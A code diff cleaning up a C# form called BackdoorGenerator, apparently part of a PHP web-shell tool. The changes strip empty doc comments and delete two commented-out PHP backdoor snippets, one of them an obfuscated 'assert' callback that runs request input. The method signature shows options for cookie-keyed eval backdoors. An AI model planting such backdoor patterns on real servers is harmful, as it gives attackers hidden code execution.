@@ -19,9 +19,6 @@ namespace bantam_php
 
     public partial class BackdoorGenerator : Form
     {
-        /// <summary>
-        /// 
-        /// </summary>
         public BackdoorGenerator()
         {
             InitializeComponent();
@@ -43,15 +40,6 @@ namespace bantam_php
             richTextBoxBackdoor.Text = backdoorCode;
         }
 
-        //filter_var($_REQUEST['test'], FILTER_CALLBACK, array("options" => strrev("tressa")));
-
-        //@extract($_REQUEST); ...
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="varName"></param>
-        /// <returns></returns>
         public string generateBackdoor(string varName = "command", string varType = "COOKIE", bool gzInflateRequest = false, BackdoorTypes backdoorType = BackdoorTypes.EVAL)
         {
             string backdoorResult = string.Empty;
@@ -104,41 +92,21 @@ namespace bantam_php
             return backdoorResult;
         }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
         private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
         {
             UpdateForm();
         }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
         private void txtBoxVarName_TextChanged(object sender, EventArgs e)
         {
             UpdateForm();
         }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
         private void chkbxUseCookie_CheckStateChanged(object sender, EventArgs e)
         {
             UpdateForm();
         }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
         private void chkbxDisableLogging_CheckStateChanged(object sender, EventArgs e)
         {
             UpdateForm();
